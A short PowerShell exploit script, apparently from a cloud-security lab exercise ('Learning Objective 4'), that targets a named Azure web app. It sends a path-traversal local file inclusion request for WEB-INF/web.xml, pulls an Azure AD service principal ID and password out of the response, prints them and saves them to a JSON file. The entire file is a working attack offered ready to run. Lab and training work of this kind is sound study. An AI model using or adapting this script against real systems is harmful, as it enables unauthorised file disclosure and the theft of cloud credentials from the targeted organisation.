# Learning Objective 4: Exploit LFI in resources app
# This script exploits the LFI vulnerability to extract application settings
# Author: rfs85

# Target URL with LFI vulnerability
$baseUrl = "https://resourcespharmacorp.azurewebsites.net/"
$lfiPath = "WEB-INF/web.xml"  # Path to Java's web.xml config file

# Construct the LFI payload URL
$exploitUrl = "${baseUrl}?fileName=../${lfiPath}"

# Function to send the request and extract credentials
function Exploit-LFI {
    Write-Host "Exploiting LFI vulnerability to read $lfiPath..."
    
    try {
        $response = Invoke-WebRequest -Uri $exploitUrl -UseBasicParsing
        
        # Check if we got a successful response
        if ($response.StatusCode -eq 200) {
            Write-Host "Successfully retrieved the file content!"
            
            # Look for potential credentials in the response
            if ($response.Content -match 'id="(.*?)".*?password="(.*?)"') {
                $appId = $matches[1]
                $password = $matches[2]
                
                Write-Host "Found potential Azure AD Service Principal credentials:"
                Write-Host "Application ID: $appId"
                Write-Host "Password: $password"
                
                # Save the credentials for later use
                $credentials = @{
                    "AppId" = $appId
                    "Password" = $password
                }
                
                $credentials | ConvertTo-Json | Out-File -FilePath "extracted_credentials.json"
                Write-Host "Credentials saved to extracted_credentials.json"
            }
            else {
                Write-Host "No credentials found in the response."
            }
        }
    }
    catch {
        Write-Host "Error: $_"
    }
}

# Execute the exploit
Exploit-LFI